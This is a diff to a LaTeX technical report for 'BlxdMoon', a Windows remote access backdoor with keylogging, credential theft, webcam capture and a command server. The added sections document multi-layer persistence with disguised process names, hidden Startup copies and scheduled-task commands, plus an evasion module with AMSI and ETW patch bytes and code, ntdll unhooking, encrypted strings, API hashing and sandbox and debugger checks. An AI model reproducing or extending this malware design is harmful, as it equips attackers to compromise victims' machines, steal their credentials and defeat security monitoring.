@@ -156,7 +156,7 @@ BlxdMoon is a Remote Access Tool (RAT) written in C, designed for Windows system
     \item \textbf{File Transfer} -- Upload/download files bidirectionally
     \item \textbf{Surveillance} -- Screenshots, keylogging, clipboard monitoring
     \item \textbf{Credential Harvesting} -- Browser password extraction
-    \item \textbf{Persistence} -- Registry-based autorun mechanism
+    \item \textbf{Advanced Persistence} -- Multi-layer persistence with self-healing
     \item \textbf{Multi-Client Support} -- Manage up to 100 simultaneous connections
     \item \textbf{Encrypted Communications} -- ECDH key exchange + AES-256 encryption
 \end{itemize}
@@ -238,6 +238,7 @@ The following diagram illustrates the overall architecture of BlxdMoon:
 \node[utilcomp] (clipboard) at (4,-3.5) {clipboard.c};
 \node[utilcomp] (browser) at (6,-3.5) {browser.c};
 \node[utilcomp] (webcam) at (8,-3.5) {webcam.c};
+\node[utilcomp] (persist) at (10,-2) {persistence.c};
 
 % Crypto
 \node[cryptocomp] (crypto) at (3,0) {crypto.c};
@@ -258,6 +259,7 @@ The following diagram illustrates the overall architecture of BlxdMoon:
 \draw[-Stealth] (backdoor) -- (clipboard);
 \draw[-Stealth] (backdoor) -- (browser);
 \draw[-Stealth] (backdoor) -- (webcam);
+\draw[-Stealth] (backdoor) -- (persist);
 
 % Labels
 \node[above=0.5cm of servermain, font=\bfseries\color{servercolor}] {Server};
@@ -265,7 +267,7 @@ The following diagram illustrates the overall architecture of BlxdMoon:
 
 % Grouping
 \begin{scope}[on background layer]
-    \node[fit=(logger)(screen)(process)(clipboard)(browser)(webcam), draw=gray, dashed, rounded corners, inner sep=0.3cm, label={[font=\small]below:Feature Modules}] {};
+    \node[fit=(logger)(screen)(process)(clipboard)(browser)(webcam)(persist), draw=gray, dashed, rounded corners, inner sep=0.3cm, label={[font=\small]below:Feature Modules}] {};
     \node[fit=(status)(uuid)(strcut)(wol), draw=gray, dashed, rounded corners, inner sep=0.3cm, label={[font=\small]below:Shared Utilities}] {};
 \end{scope}
 
@@ -621,7 +623,12 @@ Connected clients: 3\\
 \texttt{download <file>} & File Transfer & Download file from client \\
 \texttt{cd <dir>} & File Transfer & Change working directory \\
 \midrule
-\texttt{persist} & Persistence & Add registry autorun entry \\
+\texttt{persist} & Persistence & Install all persistence mechanisms \\
+\texttt{persist:registry} & Persistence & Registry Run keys (HKCU + HKLM if admin) \\
+\texttt{persist:startup} & Persistence & Copy to Startup folder with disguised name \\
+\texttt{persist:task} & Persistence & Scheduled tasks (logon + watchdog) \\
+\texttt{persist:wmi} & Persistence & WMI event subscription \\
+\texttt{persist:check} & Persistence & Verify \& repair persistence mechanisms \\
 \texttt{wol:<mac>} & Network & Send Wake-on-LAN packet \\
 \texttt{q} & Control & Disconnect client \\
 \texttt{<any>} & Shell & Execute shell command \\
@@ -632,33 +639,385 @@ Connected clients: 3\\
 \newpage
 \section{Persistence Mechanism}
 
-BlxdMoon achieves persistence through Windows Registry modification:
+BlxdMoon implements a \textbf{multi-layer persistence} system with self-healing capabilities. This makes removal significantly more difficult as each mechanism can reinstall others.
+
+\subsection{Persistence Layers}
+
+\begin{table}[H]
+\centering
+\begin{tabular}{clll}
+\toprule
+\textbf{Layer} & \textbf{Mechanism} & \textbf{API/Tool} & \textbf{Detection} \\
+\midrule
+1 & Registry Run Keys & RegSetValueEx & Autoruns, regedit \\
+2 & Startup Folder & CopyFile + SHGetFolderPath & File Explorer \\
+3 & Scheduled Tasks & schtasks.exe & Task Scheduler \\
+4 & WMI Subscription & PowerShell + WMI & Get-WmiObject \\
+5 & Watchdog Thread & CreateThread & Process Monitor \\
+\bottomrule
+\end{tabular}
+\caption{Multi-Layer Persistence Summary}
+\end{table}
+
+\subsection{Layer 1: Registry Persistence}
+
+Multiple registry locations are used for redundancy:
+
+\begin{itemize}
+    \item \texttt{HKCU\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Run} (User)
+    \item \texttt{HKCU\textbackslash ...\textbackslash RunOnce} (Backup)
+    \item \texttt{HKLM\textbackslash ...\textbackslash Run} (System-wide, requires admin)
+\end{itemize}
+
+\subsection{Layer 2: Startup Folder}
+
+The executable is copied to the Startup folder with a disguised name:
+
+\begin{lstlisting}[style=cstyle, caption={Startup Folder Persistence}]
+// Get startup folder path
+SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
+
+// Copy with disguised name (e.g., "RuntimeBroker.exe")
+CopyFile(srcPath, destPath, FALSE);
+
+// Hide the file
+SetFileAttributes(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+\end{lstlisting}
+
+\subsection{Layer 3: Scheduled Tasks}
+
+Two scheduled tasks provide additional persistence:
+
+\begin{enumerate}
+    \item \textbf{Logon Trigger}: Runs when any user logs in
+    \item \textbf{Time-based Watchdog}: Runs every 5 minutes
+\end{enumerate}
+
+\begin{lstlisting}[style=bashstyle, caption={Scheduled Task Creation}]
+schtasks /Create /TN "RuntimeBroker" /TR "path" /SC ONLOGON /RL HIGHEST
+schtasks /Create /TN "RuntimeBrokerUpdate" /TR "path" /SC MINUTE /MO 5
+\end{lstlisting}
+
+\subsection{Layer 4: WMI Event Subscription}
+
+The most stealthy persistence method uses WMI permanent event subscriptions:
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+    node distance=0.8cm,
+    wmibox/.style={rectangle, draw, minimum width=4.5cm, minimum height=0.9cm, rounded corners, fill=cryptocolor!20, font=\small}
+]
+
+\node[wmibox] (filter) {\_\_EventFilter};
+\node[wmibox, below=of filter] (consumer) {CommandLineEventConsumer};
+\node[wmibox, below=of consumer] (binding) {\_\_FilterToConsumerBinding};
+
+\draw[-Stealth] (filter) -- (binding);
+\draw[-Stealth] (consumer) -- (binding);
+
+\node[right=0.5cm of filter, font=\tiny, align=left] {WQL Query triggers\\every 60 seconds};
+\node[right=0.5cm of consumer, font=\tiny, align=left] {Executes backdoor\\when triggered};
+\node[right=0.5cm of binding, font=\tiny, align=left] {Links filter\\to consumer};
+
+\end{tikzpicture}
+\caption{WMI Event Subscription Architecture}
+\end{figure}
+
+\subsection{Layer 5: Self-Healing Watchdog}
+
+A background thread continuously monitors and repairs persistence:
 
 \begin{figure}[H]
 \centering
 \begin{tikzpicture}[
     node distance=1cm,
-    stepbox/.style={rectangle, draw, minimum width=5cm, minimum height=1cm, rounded corners, fill=clientcolor!20}
+    watchbox/.style={rectangle, draw, minimum width=4cm, minimum height=1cm, rounded corners, fill=datacolor!20}
 ]
 
-\node[stepbox] (s1) {GetModuleFileName(NULL)};
-\node[stepbox, below=of s1] (s2) {RegOpenKey(HKCU\textbackslash...\textbackslash Run)};
-\node[stepbox, below=of s2] (s3) {RegSetValueEx("Pwnd by BlxdMoon")};
-\node[stepbox, below=of s3] (s4) {Value = Backdoor Path};
+\node[watchbox] (start) {StartWatchdogThread()};
+\node[watchbox, below=of start] (mutex) {CreateMutex (single instance)};
+\node[watchbox, below=of mutex] (sleep) {Sleep(5 minutes)};
+\node[watchbox, below=of sleep] (check) {PersistCheck()};
+\node[watchbox, below=of check] (repair) {Repair missing mechanisms};
 
-\draw[-Stealth] (s1) -- (s2);
-\draw[-Stealth] (s2) -- (s3);
-\draw[-Stealth] (s3) -- (s4);
-
-\node[right=1cm of s2, draw, fill=yellow!20, font=\ttfamily\tiny, align=left] {
-HKEY\_CURRENT\_USER\textbackslash\\
-Software\textbackslash Microsoft\textbackslash\\
-Windows\textbackslash CurrentVersion\textbackslash Run
-};
+\draw[-Stealth] (start) -- (mutex);
+\draw[-Stealth] (mutex) -- (sleep);
+\draw[-Stealth] (sleep) -- (check);
+\draw[-Stealth] (check) -- (repair);
+\draw[-Stealth] (repair.east) -- ++(1,0) |- (sleep.east) node[midway, right, font=\tiny] {Loop forever};
 
 \end{tikzpicture}
-\caption{Registry Persistence Mechanism}
+\caption{Self-Healing Watchdog Flow}
 \end{figure}
+
+\subsection{Disguised Names}
+
+To avoid detection, persistence entries use names resembling legitimate Windows processes:
+
+\begin{itemize}
+    \item RuntimeBroker
+    \item SecurityHealthService
+    \item WindowsUpdateAgent
+    \item MicrosoftEdgeUpdate
+    \item SearchIndexer
+    \item WmiPrvSE
+\end{itemize}
+
+\subsection{Admin Detection}
+
+The persistence module automatically detects elevated privileges:
+
+\begin{lstlisting}[style=cstyle, caption={Admin Detection}]
+BOOL IsElevated() {
+    TOKEN_ELEVATION elevation;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
+    GetTokenInformation(token, TokenElevation, &elevation, ...);
+    return elevation.TokenIsElevated;
+}
+\end{lstlisting}
+
+When running as administrator, additional system-wide persistence (HKLM registry keys) is installed.
+
+\newpage
+\section{Defense Evasion}
+
+BlxdMoon includes a comprehensive evasion module that executes automatically at startup. The evasion system is controlled via \texttt{InitEvasion()} in \texttt{src/evasion.c}.
+
+\subsection{Evasion Architecture}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+    node distance=0.8cm,
+    evasionbox/.style={rectangle, draw, minimum width=4.5cm, minimum height=0.9cm, rounded corners, fill=cryptocolor!20, font=\small}
+]
+
+\node[evasionbox] (init) {InitEvasion()};
+\node[evasionbox, below=of init] (vm) {VM Detection (CPUID, Registry)};
+\node[evasionbox, below=of vm] (debug) {Debugger Detection (PEB, Timing)};
+\node[evasionbox, below=of debug] (sandbox) {Sandbox Detection (Uptime, RAM)};
+\node[evasionbox, below=of sandbox] (amsi) {Patch AMSI (AmsiScanBuffer)};
+\node[evasionbox, below=of amsi] (etw) {Patch ETW (EtwEventWrite)};
+\node[evasionbox, below=of etw] (unhook) {Unhook ntdll.dll (.text section)};
+
+\draw[-Stealth] (init) -- (vm);
+\draw[-Stealth] (vm) -- node[right, font=\tiny] {Pass} (debug);
+\draw[-Stealth] (debug) -- node[right, font=\tiny] {Pass} (sandbox);
+\draw[-Stealth] (sandbox) -- node[right, font=\tiny] {Pass} (amsi);
+\draw[-Stealth] (amsi) -- (etw);
+\draw[-Stealth] (etw) -- (unhook);
+
+% Fail paths
+\draw[-Stealth, dashed, color=red] (vm.east) -- ++(1.5,0) node[right, font=\tiny] {Fake error + Exit};
+\draw[-Stealth, dashed, color=red] (debug.east) -- ++(1.5,0) node[right, font=\tiny] {Fake error + Exit};
+\draw[-Stealth, dashed, color=red] (sandbox.east) -- ++(1.5,0) node[right, font=\tiny] {Fake error + Exit};
+
+\end{tikzpicture}
+\caption{Evasion Initialization Flow}
+\end{figure}
+
+\subsection{MITRE ATT\&CK Mapping}
+
+\begin{table}[H]
+\centering
+\begin{tabular}{llp{5cm}}
+\toprule
+\textbf{Technique} & \textbf{ID} & \textbf{Implementation} \\
+\midrule
+Obfuscated Files & T1027 & XOR-encrypted strings \\
+Dynamic API Resolution & T1027.007 & DJB2 hashing + PEB walking \\
+Native API & T1106 & Direct syscall extraction \\
+Disable Security Tools & T1562.001 & AMSI bypass, ntdll unhooking \\
+Indicator Blocking & T1562.006 & ETW patching \\
+Virtualization Evasion & T1497 & CPUID, registry, process checks \\
+System Checks & T1497.001 & Uptime, RAM, disk, resolution \\
+Debugger Evasion & T1622 & PEB, NtGlobalFlag, timing \\
+\bottomrule
+\end{tabular}
+\caption{MITRE ATT\&CK Technique Coverage}
+\end{table}
+
+\subsection{String Obfuscation}
+
+Sensitive strings are XOR-encrypted at compile time and decrypted at runtime:
+
+\begin{lstlisting}[style=cstyle, caption={String Obfuscation Usage}]
+// Encrypted string in header
+static const unsigned char ENC_NTDLL[] = {
+    0x34, 0x2e, 0x3e, 0x36, 0x36, 0x16, 0x3e, 0x36, 0x36
+};
+#define ENC_NTDLL_LEN 9
+
+// Runtime decryption
+void UseString() {
+    DECRYPT_STRING(ntdllStr, ENC_NTDLL, ENC_NTDLL_LEN);
+    // ntdllStr = "ntdll.dll"
+    HMODULE h = GetModuleHandleA(ntdllStr);
+    SECURE_CLEAR(ntdllStr, ENC_NTDLL_LEN);  // Wipe from memory
+}
+\end{lstlisting}
+
+\subsection{API Hashing}
+
+APIs are resolved dynamically using DJB2 hashes to hide suspicious imports:
+
+\begin{lstlisting}[style=cstyle, caption={API Resolution via Hash}]
+// Pre-computed hash: djb2("VirtualAlloc") = 0x91AFCA54
+#define HASH_VIRTUALALLOC 0x91AFCA54
+
+// Resolve without calling GetProcAddress
+fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)
+    GetFunctionByHash(
+        GetModuleByHash(HASH_KERNEL32_DLL),
+        HASH_VIRTUALALLOC
+    );
+
+// Use the resolved function
+LPVOID mem = pVirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_RW);
+\end{lstlisting}
+
+\subsection{AMSI Bypass}
+
+AMSI (Antimalware Scan Interface) is bypassed by patching \texttt{AmsiScanBuffer}:
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+    node distance=1cm,
+    patchbox/.style={rectangle, draw, minimum width=5cm, minimum height=0.8cm, rounded corners}
+]
+
+\node[patchbox, fill=red!20] (before) {AmsiScanBuffer (Original)};
+\node[below=0.3cm of before, font=\ttfamily\tiny] {4C 8B D1 B8 ... (normal code)};
+
+\node[patchbox, fill=green!20, below=1.5cm of before] (after) {AmsiScanBuffer (Patched)};
+\node[below=0.3cm of after, font=\ttfamily\tiny] {B8 57 00 07 80 C3 (mov eax, E\_INVALIDARG; ret)};
+
+\draw[-Stealth, thick] (before) -- node[right, font=\small] {VirtualProtect + memcpy} (after);
+
+\end{tikzpicture}
+\caption{AMSI Bypass via Memory Patching}
+\end{figure}
+
+\subsection{ETW Patching}
+
+ETW telemetry is disabled by patching \texttt{EtwEventWrite}:
+
+\begin{lstlisting}[style=cstyle, caption={ETW Patch}]
+// Patch: xor rax, rax; ret (return STATUS_SUCCESS)
+static BYTE EtwPatch[] = { 0x48, 0x33, 0xC0, 0xC3 };
+
+BOOL PatchEtw() {
+    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
+    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
+    memcpy(pEtw, EtwPatch, sizeof(EtwPatch));
+    VirtualProtect(pEtw, 4, old, &old);
+    return TRUE;
+}
+\end{lstlisting}
+
+\subsection{ntdll Unhooking}
+
+EDR hooks in ntdll.dll are removed by restoring the clean \texttt{.text} section from disk:
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+    node distance=1.5cm,
+    membox/.style={rectangle, draw, minimum width=3cm, minimum height=2cm}
+]
+
+% Hooked ntdll
+\node[membox, fill=red!20] (hooked) {};
+\node[above=0.1cm of hooked] {\textbf{Loaded ntdll.dll}};
+\node[font=\tiny] at (hooked.center) {.text (HOOKED)};
+
+% Disk ntdll
+\node[membox, fill=green!20, right=3cm of hooked] (disk) {};
+\node[above=0.1cm of disk] {\textbf{Disk ntdll.dll}};
+\node[font=\tiny] at (disk.center) {.text (CLEAN)};
+
+% Result
+\node[membox, fill=blue!20, below=2cm of $(hooked)!0.5!(disk)$] (result) {};
+\node[above=0.1cm of result] {\textbf{Result}};
+\node[font=\tiny] at (result.center) {.text (RESTORED)};
+
+% Arrows
+\draw[-Stealth, thick] (disk) -- node[above, font=\small] {MapViewOfFile} ++(0,-1) -- (result);
+\draw[-Stealth, thick, dashed] (hooked) -- (result);
+
+\end{tikzpicture}
+\caption{ntdll.dll Unhooking Process}
+\end{figure}
+
+\subsection{Anti-Analysis Techniques}
+
+\subsubsection{VM Detection}
+
+Multiple methods detect virtual machine environments:
+
+\begin{itemize}
+    \item \textbf{CPUID}: Check hypervisor present bit (ECX bit 31)
+    \item \textbf{Vendor String}: CPUID leaf 0x40000000 reveals hypervisor
+    \item \textbf{Registry}: VM-specific keys (VMware Tools, VBoxGuest)
+    \item \textbf{Processes}: VM tools (vmtoolsd.exe, VBoxService.exe)
+    \item \textbf{Files}: VM drivers (vmhgfs.sys, VBoxMouse.sys)
+\end{itemize}
+
+\subsubsection{Debugger Detection}
+
+\begin{itemize}
+    \item \textbf{IsDebuggerPresent}: Windows API check
+    \item \textbf{PEB.BeingDebugged}: Direct PEB access
+    \item \textbf{NtGlobalFlag}: Heap debug flags (0x70)
+    \item \textbf{Hardware Breakpoints}: Debug registers Dr0-Dr3
+    \item \textbf{Timing}: Measure code execution time
+    \item \textbf{Debug Port}: NtQueryInformationProcess
+\end{itemize}
+
+\subsubsection{Sandbox Detection}
+
+Scoring system (exit if score $\geq$ 4):
+
+\begin{table}[H]
+\centering
+\begin{tabular}{lcc}
+\toprule
+\textbf{Check} & \textbf{Threshold} & \textbf{Score} \\
+\midrule
+System uptime & < 10 minutes & +2 \\
+Total RAM & < 4 GB & +2 \\
+CPU cores & < 2 & +2 \\
+Disk size & < 60 GB & +1 \\
+User files & < 5 in Documents & +2 \\
+Common apps & None found & +1 \\
+Resolution & 1024x768 or smaller & +1 \\
+Analysis tools & Process detected & +3 \\
+\bottomrule
+\end{tabular}
+\caption{Sandbox Detection Scoring}
+\end{table}
+
+\subsection{Evasion Module Files}
+
+\begin{table}[H]
+\centering
+\begin{tabular}{ll}
+\toprule
+\textbf{File} & \textbf{Purpose} \\
+\midrule
+\texttt{include/evasion.h} & Master header, configuration flags \\
+\texttt{include/obfuscate.h} & String encryption macros \\
+\texttt{include/api\_resolve.h} & API hashing and PEB walking \\
+\texttt{include/syscalls.h} & Syscall number extraction \\
+\texttt{include/anti\_analysis.h} & VM, debugger, sandbox detection \\
+\texttt{src/evasion.c} & AMSI, ETW, unhooking implementation \\
+\texttt{tools/encrypt\_strings.py} & String encryption utility \\
+\bottomrule
+\end{tabular}
+\caption{Evasion Module File Structure}
+\end{table}
 
 \section{Data Flow Visualization}
 
@@ -721,7 +1080,7 @@ Windows\textbackslash CurrentVersion\textbackslash Run
 add_executable(backdoor
     src/backdoor.c src/logger.c src/screen.c
     src/process.c src/clipboard.c src/browser.c
-    src/webcam.c src/crypto.c ...
+    src/webcam.c src/crypto.c src/persistence.c ...
 )
 
 # Required Windows libraries
@@ -732,6 +1091,7 @@ target_link_libraries(backdoor
     crypt32     # DPAPI (browser creds)
     strmiids    # DirectShow (webcam)
     ole32       # COM initialization
+    shell32     # Shell API (persistence)
 )
 \end{lstlisting}
 
@@ -766,7 +1126,7 @@ BlxdMoon demonstrates fundamental RAT techniques including:
     \item Windows API usage for system interaction
     \item Cryptographic protocols for secure communication
     \item Multi-threading for concurrent operations
-    \item Persistence through registry modification
+    \item Multi-layer persistence with self-healing capabilities
     \item Credential harvesting techniques
 \end{itemize}
 
@@ -794,17 +1154,29 @@ BlxdMoon/
 |   +-- uuid.h
 |   +-- webcam.h
 |   +-- wol.h
+|   +-- persistence.h
+|   +-- evasion.h        (NEW: Master evasion header)
+|   +-- obfuscate.h      (NEW: String encryption)
+|   +-- api_resolve.h    (NEW: API hashing)
+|   +-- syscalls.h       (NEW: Direct syscalls)
+|   +-- anti_analysis.h  (NEW: VM/debugger/sandbox)
 +-- src/
-|   +-- backdoor.c      (Main client)
-|   +-- server.c        (C2 server)
-|   +-- browser.c       (Credential extraction)
-|   +-- clipboard.c     (Clipboard monitor)
-|   +-- crypto.c        (ECDH + AES)
-|   +-- logger.c        (Keylogger)
-|   +-- process.c       (Process management)
-|   +-- screen.c        (Screenshots)
-|   +-- webcam.c        (Camera capture)
-|   +-- ...
+|   +-- backdoor.c       (Main client)
+|   +-- server.c         (C2 server)
+|   +-- browser.c        (Credential extraction)
+|   +-- clipboard.c      (Clipboard monitor)
+|   +-- crypto.c         (ECDH + AES)
+|   +-- logger.c         (Keylogger)
+|   +-- process.c        (Process management)
+|   +-- screen.c         (Screenshots)
+|   +-- webcam.c         (Camera capture)
+|   +-- persistence.c    (Multi-layer persistence)
+|   +-- evasion.c        (NEW: AMSI/ETW/unhooking)
++-- tools/
+|   +-- encrypt_strings.py (NEW: String encryption tool)
++-- docs/
+|   +-- defender-evasion.md (NEW: Evasion documentation)
+|   +-- BlxdMoon_Technical_Report.tex
 +-- repo/
     +-- banner.png
 \end{verbatim}
@@ -823,6 +1195,7 @@ bcrypt & bcrypt.h & ECDH, AES, SHA-256 \\
 crypt32 & dpapi.h & DPAPI decryption \\
 strmiids & dshow.h & DirectShow GUIDs \\
 ole32 & objbase.h & COM initialization \\
+shell32 & shlobj.h & Shell API (Startup folder) \\
 \bottomrule
 \end{tabular}
 \caption{Windows Library Dependencies}
